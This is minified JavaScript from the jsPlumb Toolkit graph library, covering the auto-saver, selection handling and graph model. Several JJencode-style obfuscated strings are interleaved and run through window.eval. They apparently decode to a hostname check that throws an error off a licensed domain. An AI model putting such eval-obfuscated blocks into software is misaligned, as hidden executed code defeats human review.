window._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),function(){var n=["node","port","edge","group"],t=["Added","Removed","Updated","Moved"],e=["edge"],o=["Source","Target"],i=function(n,t,e,o){for(var i=0;i<n.length;i++)for(var r=0;r<t.length;r++)e.bind(n[i]+t[r],o)};this.jsPlumbToolkitUtil.AutoSaver=function(r,d,_,s,a,w,l){function u(n){return function(){n&&n.apply(n,arguments),l&&l()}}var c=!1,B=function(){if(!c){try{w&&w()}catch(n){}r.save({url:d,success:u(s),error:u(a),headers:_})}};r.bind("dataLoadStart",function(){c=!0}),r.bind("dataLoadEnd",function(){c=!1}),r.bind("graphClearStart",function(){c=!0}),r.bind("graphCleared",function(){c=!1}),i(n,t,r,B),i(e,o,r,B)},this.jsPlumbToolkitUtil.CatchAllEventHandler=function(r){var d=function(){r.fire("dataUpdated")};i(n,t,r,d),i(e,o,r,d)}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),function(){var n=this.jsPlumbToolkitUtil,t=this.jsPlumbUtil;n.Selection=function(e){t.EventGenerator.apply(this,arguments);var o,i=e.toolkit,r=[],d=[],_=[],s=Math.Infinity,a=Math.Infinity,w=Math.Infinity,l=e.generator,u={},c=this,B=e.onClear||function(){},h=function(n){return"Edge"===n.objectType?_:"Node"===n.objectType?r:d},j=function(t){var e=[],i=h(t),r="Edge"===t.objectType?a:"Node"===t.objectType?s:w;if(i.length>=r){if(o===n.Selection.DISCARD_NEW)return!1;e=i.splice(0,1),p(e[0],"Removed"),delete u[e[0].getFullId()]}return i.push(t),p(t,"Added"),e},p=function(n,t){var e=n.objectType.toLowerCase()+t,o={Group:{data:n.data,group:n},Node:{data:n.data,node:n},Port:{data:n.data,node:n.node,port:n},Edge:{data:n.data,edge:n}};c.fire(e,o[n.objectType])};this.getModel=i.getModel,this.setSuspendGraph=i.setSuspendGraph,this.getNodeId=i.getNodeId,this.getGroupId=i.getNodeId,this.getEdgeId=i.getEdgeId,this.getPortId=i.getPortId,this.getNodeType=i.getNodeType,this.getGroupType=i.getNodeType,this.getEdgeType=i.getEdgeType,this.getPortType=i.getPortType,this.getObjectInfo=i.getObjectInfo,this.isDebugEnabled=i.isDebugEnabled;var f=function(n,t){if(!u[n.getFullId()]){var e=j(n);return!1===e?[[],[]]:(u[n.getFullId()]=n,t&&t(n,!0),[[n],e])}return[[],[]]},g=function(n,e){return t.removeWithFunction(h(n),function(t){return t.id==n.id})&&p(n,"Removed"),delete u[n.getFullId()],e&&e(n,!1),[[],[]]},m=function(n,t){return u[n.getFullId()]?g(n,t):f(n,t)},v=function(n,e,o){var r,d=[],_=[];if(null==n)return d;return function n(s){var a;if(t.isString(s))null!=(a=i.getNode(s)||i.getEdge(s)||i.getGroup(s))&&(r=e(a,o),d.push.apply(d,r[0]),_.push.apply(_,r[1]));else if(s.eachNode&&s.eachEdge)s.eachNode(function(t,e){n(e)}),s.eachEdge(function(t,e){n(e)}),s.eachGroup&&s.eachGroup(function(t,e){n(e)});else if(s.each)s.each(function(t,e){n(e.vertex||e)});else if(null!=s.length)for(var w=0;w<s.length;w++)n(s[w]);else r=e(s,o),d.push.apply(d,r[0]),_.push.apply(_,r[1])}(n),[d,_]}.bind(this);i.bind("nodeRemoved",function(n){g(n.node)}),i.bind("groupRemoved",function(n){g(n.group)}),i.bind("portRemoved",function(n){g(n.port)}),i.bind("edgeRemoved",function(n){g(n.edge)}),i.bind("edgeTarget",function(n){u[n.edge.getFullId()]&&c.fire("edgeTarget",n)}),i.bind("edgeSource",function(n){u[n.edge.getFullId()]&&c.fire("edgeSource",n)}),i.bind("nodeUpdated",function(n){u[n.node.getFullId()]&&c.fire("nodeUpdated",n)}),i.bind("groupUpdated",function(n){u[n.group.getFullId()]&&c.fire("groupUpdated",n)}),i.bind("edgeUpdated",function(n){u[n.edge.getFullId()]&&c.fire("edgeUpdated",n)}),i.bind("portUpdated",function(n){u[n.port.getFullId()]&&c.fire("portUpdated",n)}),this.remove=function(n,t){return v(n,g,t)},this.append=function(n,t){return v(n,f,t)},this.toggle=function(n,t){return v(n,m,t)},this.setMaxNodes=function(n){s=n},this.setMaxEdges=function(n){a=n},this.setCapacityPolicy=function(n){o=n},this.clear=function(n){r.length=0,_.length=0,d.length=0,u={},n||B(this)},this.reload=function(){if(null!=l){var n;for(this.clear(),this.fire("dataLoadStart"),l(this,i),n=0;n<d.length;n++)c.fire("groupAdded",d[n]);for(n=0;n<r.length;n++)c.fire("nodeAdded",r[n]);for(n=0;n<_.length;n++)c.fire("edgeAdded",_[n]);this.fire("dataLoadEnd")}},this.each=function(n,e){for(var o="Edge"===e?_:"Group"===e?d:r,i=0;i<o.length;i++)try{n(i,o[i])}catch(n){t.log("Selection iterator function failed",n)}},this.eachNode=this.each,this.eachGroup=function(n){this.each(n,"Group")},this.eachNodeOrGroup=function(n){this.each(n,"Node"),this.each(n,"Group")},this.eachEdge=function(n){this.each(n,"Edge")},this.getNodeCount=function(){return r.length},this.getNodeAt=function(n){return r[n]},this.getNodes=function(){return r},this.getNode=i.getNode,this.getGroupAt=function(n){return d[n]},this.getGroups=function(){return d},this.getGroup=i.getGroup,this.getGroupCount=function(){return d.length},this.getAll=function(){var n=[];return Array.prototype.push.apply(n,r),Array.prototype.push.apply(n,_),Array.prototype.push.apply(n,d),n},this.getAllEdgesFor=function(n){for(var t=n.getAllEdges(),e=[],o=0;o<t.length;o++)null!=u[t[o].getId()]&&e.push(t[o]);return e},this.getEdgeCount=function(){return _.length},this.get=this.getNodeAt=function(n){return r[n]},this.getEdge=this.getEdgeAt=function(n){return _[n]},this.setCapacityPolicy(n.Selection.DISCARD_EXISTING)},n.Selection.DISCARD_EXISTING="discardExisting",n.Selection.DISCARD_NEW="discardNew"}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),function(){var n=this.jsPlumbGraph={};n.version="0.1",n.name="jsPlumbGraph";var t=function(n,t){var e={};this.setAttribute=function(n,t){e[n]=t},this.getAttribute=function(n){return e[n]};var o=t.getType(n||{});this.getType=function(){return o},this.setType=function(n){o=n},this.graph=t},e=function(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(n){var t=16*Math.random()|0;return("x"==n?t:3&t|8).toString(16)})},o=function(n,t,o){return null==n?e():"string"==typeof n?n:(t||o.getIdFunction())(n)||e()},i=n.Vertex=n.Node=function(e,i,d){t.apply(this,[e,d]),this.objectType="Node",this.id=o(e,i,d),this.data=function(n){return"string"==typeof n?{id:n}:n}(e),this.getFullId=function(){return this.id};var _=[],s=0,a=0,w=[],l=[],u={};this.getEdges=function(n){if(null==n||null==n.filter)return _;for(var t=[],e=0;e<_.length;e++)n.filter(_[e])&&t.push(_[e]);return t},this.getSourceEdges=function(){return this.getEdges({filter:function(n){return n.source==this}.bind(this)})},this.getTargetEdges=function(){return this.getEdges({filter:function(n){return n.target==this}.bind(this)})},this.addEdge=function(n){_.push(n),n.source!==this&&n.isDirected()||a++,n.target!==this&&n.isDirected()||s++},this.deleteEdge=function(n){for(var t=-1,e=0;e<_.length;e++)if(_[e].getId()===n.getId()){t=e;break}return t>-1&&(_.splice(t,1),n.source!==this&&n.isDirected()||a--,n.target!==this&&n.isDirected()||s--,!0)},this.getAllEdges=function(n){for(var t=this.getEdges(n).slice(0),e=0;e<w.length;e++)t.push.apply(t,w[e].getEdges(n));return t},this.addGraph=function(t){return t="string"==typeof t?new n.Graph({id:t}):t,l.push(t),t.id||(t.id=""+l.length),t},this.getGraph=function(n){for(var t=0;t<l.length;t++)if(l[t].id===n)return l[t]},this.getIndegreeCentrality=function(){for(var n=0,t=0;t<w.length;t++)n+=w[t].getIndegreeCentrality();return s+n},this.getOutdegreeCentrality=function(){for(var n=0,t=0;t<w.length;t++)n+=w[t].getOutdegreeCentrality();return a+n},this.getPorts=function(){return w},this.addPort=function(n,t){var e=o(n,t,d),i=this.getPort(e);return null==i&&(i=new r(n,t,this),w.push(i),u[i.id]=i),i},this.setPort=function(n,t){var e=this.getPort(n);return e||(e=this.addPort({id:n})),e.data=t,e.setType(this.graph.getType(t)),e},this.getPort=function(n){return u[n]};var c=function(t){return t.constructor==n.Port?t.id:t};this.removePort=function(n){if(n){for(var t=c(n),e=-1,o=!1,i=0;i<w.length;i++)if(w[i].id===t){e=i;break}if(-1!=e){var r=w[e];d.deleteVertex(r),w.splice(e,1),o=!0}delete u[t]}return o};var B=0,h={};this.setDefaultInternalCost=function(n){B=n},this.getInternalEdge=function(n,t){var e=c(n),o=c(t),i={source:u[e],target:u[o],cost:1/0};if(i.source&&i.target){var r=h[e+"-"+o]||{cost:B,directed:!1};for(var d in r)i[d]=r[d]}return i},this.setInternalEdge=function(n,t,e,o){var i=c(n),r=c(t);return h[i+"-"+r]={cost:e||B,directed:o},this.getInternalEdge(n,t)},this.inspect=function(){for(var n="{ id:"+this.id+", edges:[\n",t=0;t<_.length;t++)n+=_[t].inspect()+"\n";return n+"]}"}},r=n.Port=function(n,t,e){i.apply(this,[n,t,e.graph]),this.objectType="Port",this.getNode=function(){return e},this.getFullId=function(){return e.id+this.graph.getPortSeparator()+this.id},this.isChildOf=function(n){return e==n},this.getPorts=this.addPort=this.deletePort=this.getPort=null},d=n.Edge=function(n){t.call(this,n.data,n.graph),this.source=n.source,this.target=n.target,this.objectType="Edge";var e=n.cost||1,o=!(!1===n.directed),i=n.id;this.data=n.data||{},this.getCost=function(){return e},this.setCost=function(n){e=n},this.getId=this.getFullId=function(){return null===i?this.source.id+"_"+this.target.id:i},this.setId=function(n){i=n},this.isDirected=function(){return o},this.setDirected=function(n){o=n},this.inspect=function(){if(null!=i)return"{ id:"+i+", connectionId:null, cost:"+e+", directed:"+o+", source:"+this.source.id+", target:"+this.target.id+"}"}},_=n.Group=function(n,t,e){i.apply(this,arguments),this.objectType="Group";var o=[],r={};this.addVertex=this.addNode=function(n){return null==r[n.id]&&(o.push(n),r[n.id]=n,n.group=this,!0)},this.getVertexCount=this.getNodeCount=function(){return o.length},this.getVertices=this.getNodes=function(){return o},this.deleteVertex=this.deleteNode=function(n){if(n="string"==typeof n?r[n]:n){var t=o.indexOf(n);-1!=t&&(o.splice(t,1),delete r[n.id]),delete n.group}},this.cleanup=function(n){var t,i=this.getAllDirectEdges(),r=i.length;for(t=0;t<r;t++)e.deleteEdge(i[0]);var d=o.length;for(t=0;t<d;t++)n?e.deleteVertex(o[0]):delete o[0].group;o.length=0},this.getAllDirectEdges=function(n){var t,e=[];e.push.apply(e,this.getEdges(n).slice(0));var o=this.getPorts();for(t=0;t<o.length;t++)e.push.apply(e,o[t].getEdges(n));return e},this.getAllEdges=function(n){for(var t=[],e={},i=0;i<o.length;i++)Array.prototype.push.apply(t,o[i].getAllEdges(n).filter(function(n){var t=n.getId(),o=null==e[t];return e[t]=!0,o}));return t.push.apply(t,this.getAllDirectEdges(n)),t}},s=n.Cluster=function(n){this.vertices=[n],this.addVertex=function(n){this.vertices.push(n)}},a=(n.Graph=function(t){t=t||{},this.vertices=[],this.edges=[],this.groups=[],this.id=t.id;var e={},r=0,a={},w=0,l={},B=0,h=!(!1===t.defaultDirected),j=t.defaultCost||1,p=t.idFunction||function(n){return n.id},f=t.typeFunction||function(n){return n.type||"default"},g=!0===t.enableSubgraphs,m=t.portSeparator||".",v={},C=function(n){delete v[n.id]},b=function(n){v[n.id]=n};this.setIdFunction=function(n){p=n},this.getIdFunction=function(){return p},this.setTypeFunction=function(n){f=n},this.getType=function(n){return f(n)},this.getTopLevelElements=function(){return v},this.setEnableSubgraphs=function(n){g=n},this.setPortSeparator=function(n){m=n},this.getPortSeparator=function(){return m};var y=function(t,o){if(null==t)return null;if("string"!=typeof t){if(t.constructor==n.Port||t.constructor==n.Node||t.constructor==n.Group)return t;var i=t;if("string"!=typeof(t=p(t)))return i}var r=g?t.split("/"):[t],d=function(n){if(e[n])return e[n];if(l[n])return l[n];var t=n.split(m),i=t[0],r=e[i]||l[i];if(2===t.length&&null!=r){var d=r.getPort(t[1]);return null==d&&o&&(d=r.addPort(t[1])),d}return r};if(1==r.length)return d(r[0]);if(r.length>1&&r%2==0)throw"Subgraph path format error.";for(var _=null,s=0;s<r.length-1;s+=2)_=d(r[s]).getGraph(r[s+1]);return _.getVertex(r[r.length-1])};this.clear=function(){this.vertices.length=0,this.groups.length=0,r=0,w=0,e={},a={},l={},v={}},this.getVertices=this.getNodes=function(){return this.vertices},this.getVertexCount=this.getNodeCount=function(){return this.vertices.length},this.getVertexAt=this.getNodeAt=function(n){return this.vertices[n]},this.getEdgeCount=function(){return w},this.addEdge=function(n,t,e){var i=null==n.directed?!0===h:!(!1===n.directed),r=n.cost||j,_=o(n.data,t,this),s=y(n.source,!0),l=y(n.target,!0);if(null==s||null==s.objectType)throw new TypeError("Unknown source node ["+n.source+"]");if(null==l||null==l.objectType)throw new TypeError("Unknown target node ["+n.target+"]");if(e&&!e(s,l))return null;var u=new d({source:s,target:l,cost:r,directed:i,data:n.data||{},id:_,graph:this});return u.source.addEdge(u),u.source!==u.target&&u.target.addEdge(u),a[_]=u,w++,u},this.addVertex=this.addNode=function(n,t){var o=new i(n,t||p,this);return e[o.id]?null:(this.vertices.push(o),e[o.id]=o,o._id=r++,b(o),o)},this.addVertices=this.addNodes=function(n,t){for(var e=0;e<n.length;e++)this.addVertex(n[e],t||p)},this.addGroup=function(n,t){var e=new _(n,t||p,this);return l[e.id]?l[e.id]:(this.groups.push(e),l[e.id]=e,e._id=B++,b(e),e)},this.getGroupCount=function(){return this.groups.length},this.getGroupAt=function(n){return this.groups[n]},this.addVertexToGroup=function(n,t){t="string"==typeof t?l[t]:t,(n=y(n))&&t&&(t.addVertex(n),C(n))},this.addVerticesToGroup=function(n,t){for(var e=0;e<n.length;e++)this.addVertexToGroup(n[e],t)},this.deleteVertexFromGroup=function(n){(n=y(n))&&n.group&&(n.group.deleteVertex(n),b(n))},this.deleteVerticesFromGroup=function(n,t){for(var e=0;e<n.length;e++)this.deleteVertexFromGroup(n[e],t)},this.deleteGroup=function(n,t){if(n="string"==typeof n?l[n]:n){n.cleanup(t),delete l[n.id];for(var e=-1,o=0;o<this.groups.length;o++)if(this.groups[o].id===n.id){e=o;break}return e>-1&&this.groups.splice(e,1),C(n),n}},this.getGroup=function(n){return"string"==typeof n?l[n]:n},this.deleteVertex=this.deleteNode=function(n){var t=y(n);if(t){for(var o=-1,i=0;i<this.vertices.length;i++)if(this.vertices[i].id===t.id){o=i;break}o>-1&&(this.vertices.splice(o,1),null!=t.group&&t.group.deleteVertex(t));for(var d=t.getEdges(),_=0;_<d.length;_++)this.deleteEdge(d[_]);if(w-=d.length,t.getPorts)for(var s=t.getPorts(),a=0;a<s.length;a++)this.deleteVertex(s[a]);delete e[t.id],r--,C(t)}},this.deleteEdge=function(n){if(null!=(n=this.getEdge(n))){var t=y(n.source);t&&t.deleteEdge(n)&&w--;var e=y(n.target);e&&e.deleteEdge(n),delete a[n.getId()]}},this.getEdge=function(t){if(null!=t){if("string"!=typeof t){if(t.constructor==n.Edge)return t;var e=t;if("string"!=typeof(t=p(t)))return e}return a[t]}},this.getEdges=function(n){var t,e=(n=n||{}).source,o=n.target,i=n.filter||function(){return!0},r=[],d=function(n){i(n)&&function(n){return!(null!=e&&n.source==_!==e||null!=o&&n.target==_!==o)}(n)&&r.push(n)};if(n.node){var _=y(n.node),s=_.getAllEdges();for(t=0;t<s.length;t++)d(s[t])}else for(t in a)d(a[t]);return r},this.getAllEdges=function(){var 